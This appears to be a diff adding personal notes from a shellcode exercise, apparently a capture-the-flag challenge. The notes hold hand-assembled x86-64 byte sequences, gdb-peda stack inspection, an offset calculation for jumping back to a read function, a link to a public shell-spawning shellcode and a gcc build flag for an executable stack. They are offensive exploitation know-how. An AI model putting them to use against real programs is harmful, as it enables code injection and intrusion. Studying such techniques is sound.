@@ -1,0 +1,90 @@
+0:  5a                      pop    rdx
+1:  52                      push   rdx
+
+or:
+ff c1                   inc    ecx
+echo -ne "\xff\xc1\x90\x90" > inc_ecx # infinite loop
+echo -ne "\xeb\xfe\x90\x90" > inc_ecx # infinite loop
+
+
+=> 0x7ffff7ff5000:	mov    ecx,0x1000
+   0x7ffff7ff5005:	pop    rdx
+   0x7ffff7ff5006:	push   rdx
+   0x7ffff7ff5007:	nop
+   0x7ffff7ff5008:	nop
+   0x7ffff7ff5009:	sub    ecx,0x1
+   0x7ffff7ff500c:	jne    0x7ffff7ff5005
+   0x7ffff7ff500e:	ret
+
+read_n(rsi=size, rdi=buffer)
+
+gdb-peda$ p/a &read_n
+$13 = 0x555555554a80 <read_n>
+gdb-peda$ x/4a $rsp
+0x7fffffffdeb8:	0x555555554b18 <do_test+88>	0x7ffff7de9650 <_dl_fini>
+0x7fffffffdec8:	0x0	0x0
+
+0x555555554b18
+
+# {{{
+0: ff a4 24 68 ff ff ff    jmp    QWORD PTR [rsp-0x98]
+
+0: ff b4 24 68 ff ff ff    push   QWORD PTR [rsp-0x98]
+
+0: ff 94 24 68 ff ff ff    call   QWORD PTR [rsp-0x98]
+
+>>> r = 0x555555554a80
+>>> l = 0x555555554b18
+>>> r - l
+-152
+>>> l - 152 == r
+
+0:  41 5f                   pop    r15
+2:  41 57                   push   r15
+"\x41\x5F\x41\x57"
+
+====
+sub r15, 152
+ret
+
+===
+0:  41 ff d7                call   r15
+"\x41\xFF\xD7"
+call r15
+# }}}
+
+###########
+0:  49 89 df                mov    r15,rbx
+3:  c3                      ret
+"\x49\x89\xDF\xC3"
+
+###########
+0:  49 ff c7                inc    r15
+3:  c3                      ret
+"\x49\xFF\xC7\xC3"
+
+###########
+movb [r15], 1
+0:  41 c6 07 01             mov    BYTE PTR [r15],0x1
+"\x41\xC6\x07\x01"
+
+
+###########
+0:  41 ff e7                jmp    r15
+3:  c3                      ret # useless here..
+"\x41\xFF\xE7\xC3"
+
+0:  41 c6 07 01             mov    BYTE PTR [r15],0x1
+================
+0:  41 5f                   pop    r15
+2:  41 57                   push   r15
+b"\x41\x5F\x41\x57"
+===============
+xchg r15, rax
+push r14
+0:  49 97                   xchg   r15,rax
+2:  41 56                   push   r14
+"\x49\x97\x41\x56"
+
+http://shell-storm.org/shellcode/files/shellcode-806.php
+gcc shellcode.c -z execstack
